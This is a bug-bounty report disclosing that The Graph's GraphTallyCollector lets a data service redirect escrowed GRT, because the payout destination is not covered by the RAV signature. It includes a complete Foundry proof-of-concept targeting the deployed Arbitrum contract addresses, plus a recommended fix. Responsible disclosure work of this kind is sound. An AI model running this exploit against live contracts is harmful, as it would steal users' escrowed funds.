# Unsigned receiverDestination lets a data service steal GraphTallyCollector escrowed GRT

Severity: Critical

Bounty Criteria Match: critical (smart contract): A bug that could cause significant (>$1M) User funds to be lost or stolen directly from protocol smart contracts (not including slashing)

Affected Assets / Contracts:
- GraphTallyCollector, Arbitrum `0x8f69F5C07477Ac46FBc491B1E6D91E2bb0111A9e`: [`collect` / `_collect`](https://github.com/graphprotocol/contracts/blob/52b5356d3efea1508396b7f46a18854fb7ae9112/packages/horizon/contracts/payments/collectors/GraphTallyCollector.sol#L76-L191), [`_encodeRAV`](https://github.com/graphprotocol/contracts/blob/52b5356d3efea1508396b7f46a18854fb7ae9112/packages/horizon/contracts/payments/collectors/GraphTallyCollector.sol#L209-L225)
- PaymentsEscrow, Arbitrum `0xf6Fcc27aAf1fcD8B254498c9794451d82afC673E`: [`collect`](https://github.com/graphprotocol/contracts/blob/52b5356d3efea1508396b7f46a18854fb7ae9112/packages/horizon/contracts/payments/PaymentsEscrow.sol#L127-L164)
- GraphPayments, Arbitrum `0x7Aae8ae011927BC36Cb4d0d3e81f2E6E30daE06D`: [`collect`](https://github.com/graphprotocol/contracts/blob/52b5356d3efea1508396b7f46a18854fb7ae9112/packages/horizon/contracts/payments/GraphPayments.sol#L53-L117)
- SubgraphService, Arbitrum `0xb2Bb92d0DE618878E438b55D5846cfecD9301105`: [`setPaymentsDestination` and `_encodeGraphTallyData`](https://github.com/graphprotocol/contracts/blob/52b5356d3efea1508396b7f46a18854fb7ae9112/packages/subgraph-service/contracts/SubgraphService.sol#L341-L612)
- L2GraphToken / GRT, Arbitrum `0x9623063377AD1B27544C965cCd7342f7EA7e88C7`

## Executive Summary

`GraphTallyCollector` verifies a payer-authorized Receipt Aggregate Voucher (RAV) before releasing GRT from `PaymentsEscrow`, but the RAV signature does not bind the service provider's payout destination. The public collector decodes `receiverDestination` from caller-supplied calldata and forwards it into `GraphPayments`, where the receiver's share is transferred to that address. A data service named in a valid RAV can therefore call the collector directly and replace the intended provider destination with an attacker wallet.

The local Arbitrum fork PoC uses the deployed in-scope contracts and an unchanged signed RAV, changes only `receiverDestination`, and redirects 19,800,000 GRT to the attacker while emptying escrow. For any high-value escrow/RAV above the program's $1M threshold, this is direct theft of user funds from protocol smart contracts, not slashing.

## Vulnerability Details

The payout invariant is that the receiver share of a RAV settlement must go to a destination authorized by the service provider or committed by the signed payment authorization. The RAV typehash and digest omit `receiverDestination`; the signed fields stop at payer, service provider, data service, aggregate value, timestamp, and metadata.

```solidity
bytes32 private constant EIP712_RAV_TYPEHASH =
    keccak256(
        "ReceiptAggregateVoucher(bytes32 collectionId,address payer,address serviceProvider,address dataService,uint64 timestampNs,uint128 valueAggregate,bytes metadata)"
    );

abi.encode(
    EIP712_RAV_TYPEHASH,
    _rav.collectionId,
    _rav.payer,
    _rav.serviceProvider,
    _rav.dataService,
    _rav.timestampNs,
    _rav.valueAggregate,
    keccak256(_rav.metadata)
)
```

The collector then treats `receiverDestination` as trusted settlement data even though it was decoded from unsigned calldata supplied by `msg.sender`. The authorization checks prove only that the caller is the RAV data service, the signer is authorized for the payer, and the service provider has an active provision with that data service.

```solidity
(SignedRAV memory signedRAV, uint256 dataServiceCut, address receiverDestination) = abi.decode(
    _data,
    (SignedRAV, uint256, address)
);
require(signedRAV.rav.dataService == msg.sender, ...);
_requireAuthorizedSigner(signedRAV);

address receiver = signedRAV.rav.serviceProvider;
tokensCollected[dataService][collectionId][receiver][signedRAV.rav.payer] += tokensToCollect;
_graphPaymentsEscrow().collect(
    _paymentType,
    signedRAV.rav.payer,
    receiver,
    tokensToCollect,
    dataService,
    dataServiceCut,
    receiverDestination
);
```

`PaymentsEscrow` debits the payer's escrow for `(payer, collector, receiver)` and passes the untrusted destination onward. `GraphPayments` then pushes the receiver's remaining GRT to `receiverDestination` instead of deriving it from the receiver.

```solidity
account.balance -= tokens;
_graphPayments().collect(paymentType, receiver, tokens, dataService, dataServiceCut, receiverDestination);
```

```solidity
if (receiverDestination == address(0)) {
    _graphStaking().stakeTo(receiver, tokensRemaining);
} else {
    _graphToken().pushTokens(receiverDestination, tokensRemaining);
}
```

`SubgraphService` has a provider-controlled `paymentsDestination` and uses it when it mediates query-fee collection, but the collector's direct public entry point does not enforce that route or compare the supplied destination to the registered value.

```solidity
function setPaymentsDestination(address paymentsDestination_) external override {
    _setPaymentsDestination(msg.sender, paymentsDestination_);
}

return abi.encode(_signedRav, _curationCut, paymentsDestination[_signedRav.rav.serviceProvider]);
```

Because `tokensCollected` is incremented for the legitimate tuple, the provider cannot later recollect the aggregate after the attacker consumes it.

## Attack Preconditions and Threat Model

The attacker is unprivileged and acts only as the `dataService` address named in a valid RAV. The attack does not require governance, owner, proxy admin, dispute manager, payer, signer, or service-provider keys; it does not rely on leaked credentials, compromised accounts, phishing, social engineering, deployment mistakes, or mistaken trusted/admin behavior.

Required normal-state conditions are: the payer has escrowed GRT for `(GraphTallyCollector, serviceProvider)`, the payer or authorized signer has issued a RAV with value above the already collected amount, the RAV names the attacker's data service, and the service provider has an active provision with that data service.

## Exploit Walkthrough

1. A payer deposits GRT into `PaymentsEscrow` for `collector = GraphTallyCollector` and `receiver = serviceProvider`.
2. The payer's authorized signer signs a RAV for `payer`, `serviceProvider`, `dataService`, `collectionId`, and `valueAggregate`; no payout destination is signed.
3. The attacker, controlling the RAV's `dataService`, builds collector calldata with the valid `signedRAV`, `dataServiceCut = 0`, and `receiverDestination = attackerDestination`.
4. The attacker calls `GraphTallyCollector.collect(QueryFee, data)` directly from `dataService`.
5. The collector accepts the unchanged RAV signature, records the aggregate as collected for the service provider, and calls `PaymentsEscrow.collect` with the attacker-chosen destination.
6. `PaymentsEscrow` debits the payer escrow and `GraphPayments` sends the receiver's post-protocol-cut share to `attackerDestination`.
7. The legitimate service provider receives no liquid GRT and no restaked GRT for the collected aggregate, while the escrow balance for that RAV is consumed.

## Impact and Bounty Severity

The stolen asset is GRT held by the in-scope `PaymentsEscrow` contract. The loss per exploit is bounded by the escrow balance and uncollected RAV aggregate delta, but there is no code-level cap that prevents a single high-value RAV from exceeding $1M. The PoC demonstrates a 20,000,000 GRT aggregate on a local Arbitrum fork; after the current protocol cut, 19,800,000 GRT is transferred to the attacker, escrow becomes zero, and the provider's balance and stake remain unchanged.

This matches the Critical smart-contract row because a bug in in-scope contracts can cause significant `>$1M` user funds to be stolen directly from protocol smart contracts. The exploit uses normal collection permissions for the named data service and does not depend on slashing, oracle data, liquidity conditions, governance control, privileged access, or live-chain testing.

## Proof of Code

Repository/package: this finding is for the `graphprotocol-contracts` repository, specifically the `packages/horizon` package.

Secret Gist PoC bundle: https://gist.github.com/apmfree78/514d2703ba090889e33ff67e91855ded

Save as, from the `graphprotocol-contracts` repo root: `packages/horizon/test/UnsignedRavPayoutDestinationPoC.t.sol`

Run from the `graphprotocol-contracts` repo root: `cd packages/horizon && forge test --match-path test/UnsignedRavPayoutDestinationPoC.t.sol --fork-url "$ARBITRUM_RPC_URL" --fork-block-number 460062146`

Prerequisites: install the repository dependencies for `graphprotocol-contracts` and set `ARBITRUM_RPC_URL` to an Arbitrum One RPC endpoint.

Expected result: the single test passes and asserts that the same signed RAV with a changed `receiverDestination` redirects 19,800,000 GRT to the attacker, empties the payer escrow, and leaves the provider balance and stake unchanged.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {Test} from "forge-std/Test.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {IGraphToken} from "@graphprotocol/interfaces/contracts/contracts/token/IGraphToken.sol";
import {IGraphPayments} from "@graphprotocol/interfaces/contracts/horizon/IGraphPayments.sol";
import {IGraphTallyCollector} from "@graphprotocol/interfaces/contracts/horizon/IGraphTallyCollector.sol";
import {IPaymentsEscrow} from "@graphprotocol/interfaces/contracts/horizon/IPaymentsEscrow.sol";
import {IHorizonStaking} from "@graphprotocol/interfaces/contracts/horizon/IHorizonStaking.sol";

interface IGraphTallyCollectorStorageForDestinationPoC is IGraphTallyCollector {
    function tokensCollected(address dataService, bytes32 collectionId, address receiver, address payer)
        external
        view
        returns (uint256);
}

contract UnsignedRavPayoutDestinationPoC is Test {
    IGraphToken private constant GRT = IGraphToken(0x9623063377AD1B27544C965cCd7342f7EA7e88C7);
    IHorizonStaking private constant STAKING = IHorizonStaking(0x00669A4CF01450B64E8A2A20E9b1FCB71E61eF03);
    IPaymentsEscrow private constant ESCROW = IPaymentsEscrow(0xf6Fcc27aAf1fcD8B254498c9794451d82afC673E);
    IGraphPayments private constant PAYMENTS = IGraphPayments(0x7Aae8ae011927BC36Cb4d0d3e81f2E6E30daE06D);
    IGraphTallyCollectorStorageForDestinationPoC private constant COLLECTOR =
        IGraphTallyCollectorStorageForDestinationPoC(0x8f69F5C07477Ac46FBc491B1E6D91E2bb0111A9e);

    uint256 private constant PAYER_PRIVATE_KEY = 0xA11CE;
    uint256 private constant SIGNER_PRIVATE_KEY = 0xB0B;
    uint256 private constant PROVISION_AMOUNT = 1 ether;
    uint256 private constant RAV_AMOUNT = 20_000_000 ether;
    bytes32 private constant COLLECTION_ID = keccak256("unsigned receiver destination poc");

    address private payer;
    address private signer;
    address private serviceProvider;
    address private maliciousDataService;
    address private attackerDestination;

    function testUnsignedReceiverDestinationRedirectsProviderPayout() external {
        require(block.chainid == 42161, "run on an Arbitrum One fork");

        _setActors();
        _provisionMaliciousDataService();
        _depositEscrowAndAuthorizeSigner();

        IGraphTallyCollector.SignedRAV memory signedRAV = _signRAV(_rav(), SIGNER_PRIVATE_KEY);
        assertEq(COLLECTOR.recoverRAVSigner(signedRAV), signer);

        bytes memory honestPayload = abi.encode(signedRAV, uint256(0), serviceProvider);
        bytes memory attackerPayload = abi.encode(signedRAV, uint256(0), attackerDestination);
        assertTrue(keccak256(honestPayload) != keccak256(attackerPayload));

        _collectToUnsignedDestination(attackerPayload);
    }

    function _setActors() private {
        payer = vm.addr(PAYER_PRIVATE_KEY);
        signer = vm.addr(SIGNER_PRIVATE_KEY);
        serviceProvider = makeAddr("honest service provider");
        maliciousDataService = makeAddr("malicious data service");
        attackerDestination = makeAddr("attacker payout wallet");
    }

    function _provisionMaliciousDataService() private {
        vm.deal(serviceProvider, 1 ether);
        deal(address(GRT), serviceProvider, PROVISION_AMOUNT);

        // The malicious data service is a valid Horizon verifier for this service provider on the fork.
        vm.startPrank(serviceProvider);
        GRT.approve(address(STAKING), PROVISION_AMOUNT);
        STAKING.stake(PROVISION_AMOUNT);
        STAKING.provision(serviceProvider, maliciousDataService, PROVISION_AMOUNT, 0, 0);
        vm.stopPrank();
        assertEq(STAKING.getProviderTokensAvailable(serviceProvider, maliciousDataService), PROVISION_AMOUNT);
    }

    function _depositEscrowAndAuthorizeSigner() private {
        vm.deal(payer, 1 ether);
        deal(address(GRT), payer, RAV_AMOUNT);

        // The payer authorizes a signer and deposits GRT into the real deployed escrow for this collector/provider tuple.
        vm.startPrank(payer);
        GRT.approve(address(ESCROW), RAV_AMOUNT);
        ESCROW.deposit(address(COLLECTOR), serviceProvider, RAV_AMOUNT);
        vm.stopPrank();
        _authorizeSigner(payer, signer, SIGNER_PRIVATE_KEY);
        assertEq(ESCROW.getBalance(payer, address(COLLECTOR), serviceProvider), RAV_AMOUNT);
    }

    function _rav() private view returns (IGraphTallyCollector.ReceiptAggregateVoucher memory) {
        return IGraphTallyCollector.ReceiptAggregateVoucher({
            collectionId: COLLECTION_ID,
            payer: payer,
            serviceProvider: serviceProvider,
            dataService: maliciousDataService,
            timestampNs: uint64(block.timestamp * 1e9),
            valueAggregate: uint128(RAV_AMOUNT),
            metadata: abi.encode("payer approved serviceProvider/dataService/value only")
        });
    }

    function _collectToUnsignedDestination(bytes memory attackerPayload) private {
        uint256 protocolCut = _mulPPMRoundUp(RAV_AMOUNT, PAYMENTS.PROTOCOL_PAYMENT_CUT());
        uint256 redirectedToAttacker = RAV_AMOUNT - protocolCut;
        uint256 attackerBalanceBefore = GRT.balanceOf(attackerDestination);
        uint256 providerBalanceBefore = GRT.balanceOf(serviceProvider);
        uint256 providerStakeBefore = STAKING.getStake(serviceProvider);

        // The signed RAV is unchanged, but the caller chooses a payout address that the payer never signed.
        vm.prank(maliciousDataService);
        uint256 collected = COLLECTOR.collect(IGraphPayments.PaymentTypes.QueryFee, attackerPayload);

        assertEq(collected, RAV_AMOUNT);
        assertEq(GRT.balanceOf(attackerDestination) - attackerBalanceBefore, redirectedToAttacker);
        assertGt(redirectedToAttacker, 0);
        assertEq(protocolCut + redirectedToAttacker, RAV_AMOUNT);
        assertEq(GRT.balanceOf(serviceProvider), providerBalanceBefore);
        assertEq(STAKING.getStake(serviceProvider), providerStakeBefore);
        assertEq(ESCROW.getBalance(payer, address(COLLECTOR), serviceProvider), 0);
        assertEq(COLLECTOR.tokensCollected(maliciousDataService, COLLECTION_ID, serviceProvider, payer), RAV_AMOUNT);
    }

    function _authorizeSigner(address authorizer, address authorizedSigner, uint256 signerPrivateKey) private {
        uint256 proofDeadline = block.timestamp + 1 hours;
        bytes32 messageHash = keccak256(
            abi.encodePacked(block.chainid, address(COLLECTOR), "authorizeSignerProof", proofDeadline, authorizer)
        );
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(messageHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, digest);

        vm.prank(authorizer);
        COLLECTOR.authorizeSigner(authorizedSigner, proofDeadline, abi.encodePacked(r, s, v));
        assertTrue(COLLECTOR.isAuthorized(authorizer, authorizedSigner));
    }

    function _signRAV(IGraphTallyCollector.ReceiptAggregateVoucher memory rav, uint256 signerPrivateKey)
        private
        view
        returns (IGraphTallyCollector.SignedRAV memory)
    {
        bytes32 digest = COLLECTOR.encodeRAV(rav);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, digest);
        return IGraphTallyCollector.SignedRAV({rav: rav, signature: abi.encodePacked(r, s, v)});
    }

    function _mulPPMRoundUp(uint256 value, uint256 ppm) private pure returns (uint256) {
        if (value == 0 || ppm == 0) {
            return 0;
        }
        return (value * ppm + 1_000_000 - 1) / 1_000_000;
    }
}
```

## Recommended Fix

Do not accept `receiverDestination` as unsigned caller data. Either add it to `ReceiptAggregateVoucher` and the EIP-712 typehash, or remove the calldata override and resolve the destination from a service-provider-controlled registry. Direct `GraphTallyCollector.collect` calls should enforce the same destination rule as `SubgraphService`.

Add regression tests where a valid signed RAV is collected with a different `receiverDestination` and must revert, plus an honest-path test proving the provider's configured destination, or zero-address restaking choice, receives the receiver share.

## References

- The Graph Immunefi program: https://immunefi.com/bug-bounty/thegraph/information/
- The Graph Immunefi scope: https://immunefi.com/bug-bounty/thegraph/scope/
- Immunefi severity system v2.3: https://immunefi.com/immunefi-vulnerability-severity-classification-system-v2-3/
- Source commit: https://github.com/graphprotocol/contracts/tree/52b5356d3efea1508396b7f46a18854fb7ae9112
- GraphTallyCollector source: https://github.com/graphprotocol/contracts/blob/52b5356d3efea1508396b7f46a18854fb7ae9112/packages/horizon/contracts/payments/collectors/GraphTallyCollector.sol
- PaymentsEscrow source: https://github.com/graphprotocol/contracts/blob/52b5356d3efea1508396b7f46a18854fb7ae9112/packages/horizon/contracts/payments/PaymentsEscrow.sol
- GraphPayments source: https://github.com/graphprotocol/contracts/blob/52b5356d3efea1508396b7f46a18854fb7ae9112/packages/horizon/contracts/payments/GraphPayments.sol
- SubgraphService source: https://github.com/graphprotocol/contracts/blob/52b5356d3efea1508396b7f46a18854fb7ae9112/packages/subgraph-service/contracts/SubgraphService.sol
- Arbitrum fork PoC assumptions: Arbitrum One, `ARBITRUM_RPC_URL`, fork block `460062146`, no broadcast mode.
